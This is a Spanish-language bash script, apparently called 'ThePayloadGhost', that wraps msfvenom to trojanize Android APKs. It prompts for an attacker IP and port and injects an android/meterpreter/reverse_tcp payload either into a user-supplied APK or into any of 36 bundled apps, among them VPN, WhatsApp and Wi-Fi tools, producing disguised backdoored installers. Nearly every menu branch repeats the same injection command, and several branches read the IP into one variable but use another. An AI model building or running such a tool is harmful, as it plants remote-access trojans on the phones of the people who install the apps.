setterm -foreground green
cd /root/Escritorio/
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground white
echo "-------------------------------------------------"
setterm -foreground yellow
echo "{1} Infectar APK propia legitima"
echo "{2} Ver las opciones que trae ThePayloadGhost"
setterm -foreground white
echo "-------------------------------------------------"
echo ""
setterm -foreground white
read -p "TheṔayloadGhost > " x
case $x in 
1)
clear
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese la ruta de su APK > " ruta
read -p $"Ingrese su IP > " ip
read -p $"Ingrese su puerto > " puerto
read -p $"Ingrese la ruta donde se guarda su APK > " ruta2
read -p $"¿Como se va llamar tu apk nueva? " nombre
setterm -foreground cyan
echo "=================================================="
setterm -foreground yellow
msfvenom -x $ruta -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto R > $ruta2$nombre.apk
;;
2)
setterm -foreground blue
echo "        The Payload Ghost tiene 32 apk legitimas por asi no pudiste hacer tu cometido"
setterm -foreground white
echo "=============================================================================================="
echo "[1] 0daysExploits.apk         [13] FakeTextMessage.apk       [25] SpoofText.apk"
echo "[2] AdminPanelFinder.apk      [14] Hash_Decrypt.apk          [26] SpyKitUniversalmailer.apk"
echo "[3] AircrackGUI.apk           [15] Hash_Droid.apk            [27] SQLCipher.apk"    
echo "[4] AirMon.apk                [16] Hijacker.apk              [28] TextConverter.apk"
echo "[5] AndroidNmap.apk           [17] KaliLinux.apk             [29] USBKeyboard.apk"   
echo "[6] FacebookKEYLOGGER.apk     [18] Nessus.apk                [30] WhatsAppBomber.apk" 
echo "[7] ASQLI.apk                 [19] OpenVPN.apk               [31] WhatsAppSniffer.apk"
echo "[8] Bulbsecurity.apk          [20] OrBotTor.apk              [32] WhatsappSpammer.apk"
echo "[9] CellIDInfo.apk            [21] Proxy_Browser.apk         [33] WiFiCredentialsRecovery.apk"
echo "[10] Droid.apk                [22] ProxyDroid.apk            [34] WiFiKeyRecovery.apk"
echo "[11] DroidSQLi.apk            [23] ProxyServer.apk           [35] WiFinspect.apk"
echo "[12] ExifViewer.apk           [24] SpoofMailerFakMailer.apk  [36] VPNMaster.apk"
echo "                                                             [99] Para salir"
echo "==============================================================================================="
setterm -foreground blue
echo "                                                                Desarollo Error404"
esac
setterm -foreground yellow
read -p "ThePayloadGhost > " xx
case $xx in
1)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip2
read -p $"Ingrese su puerto > " puerto2
read -p $"Ingrese la ruta donde se guarda su APK > " ruta3
read -p $"¿Como se va llamar tu apk nueva? " nombre2
setterm -foreground cyan
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/0daysExploits.apk -p android/meterpreter/reverse_tcp LHOST=$ip2 LPORT=$puerto2 R > $ruta3$nombre2.apk
;;
2)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/AdminPanelFinder.apk  -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
3)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip23
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/AircrackGUI.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
4)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/AirMon.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
5)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/AndroidNmap.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
6)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/FacebookKEYLOGGER.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
7)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/ASQLI.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
8)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/Bulbsecurity.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
9)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/CellIDInfo.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
10)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/Droid.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
11)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/DroidSQLi.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
12)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/ExifViewer.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
13)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/FakeTextMessage.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
14)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/Hash_Decrypt.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
15)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/Hash_Droid.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
16)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/Hijacker.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
17)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/KaliLinux.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
18)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/Nessus.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
19)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/OpenVPN.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
20)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/OrBotTor.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
21)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/Proxy_Browser.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
22)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/ProxyDroid.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
23)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3 
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/ProxyServer.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
24)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/SpoofMailerFakMailer.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
25)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/SpoofText.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
26)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/SpyKitUniversalmailer.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
27)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/SQLCipher.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
28)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/TextConverter.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
29)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/USBKeyboard.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
30)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/WhatsAppBomber.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
31)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/WhatsAppSniffer.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
32)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/WhatsappSpammer.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
33)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto3
read -p $"Ingrese la ruta donde se guarda su APK > " ruta4
read -p $"¿Como se va llamar tu apk nueva? " nombre3
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/WiFiCredentialsRecovery.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto3 R > $ruta4$nombre3.apk
;;
34)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip
read -p $"Ingrese su puerto > " puerto
read -p $"Ingrese la ruta donde se guarda su APK > " ruta
read -p $"¿Como se va llamar tu apk nueva? " nombre
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/WiFiKeyRecovery.apk -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto R > $ruta$nombre.apk
;;
35)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip
read -p $"Ingrese su puerto > " puerto
read -p $"Ingrese la ruta donde se guarda su APK > " ruta
read -p $"¿Como se va llamar tu apk nueva? " nombre
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/WiFinspect.apk -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto R > $ruta$nombre.apk
;;
36)
setterm -foreground cyan
echo "=================================================="
setterm -foreground white
read -p $"Ingrese su IP > " ip3
read -p $"Ingrese su puerto > " puerto
read -p $"Ingrese la ruta donde se guarda su APK > " ruta
read -p $"¿Como se va llamar tu apk nueva? " nombre
setterm -foreground cyan 
echo "=================================================="
msfvenom -x /root/Escritorio/ThePayloadGhost/APKS/VPNMaster.apk -p android/meterpreter/reverse_tcp LHOST=$ip3 LPORT=$puerto R > $ruta$nombre.apk
;;
99)
echo "Saliendo..."
sleep 4
exit
;;
esac
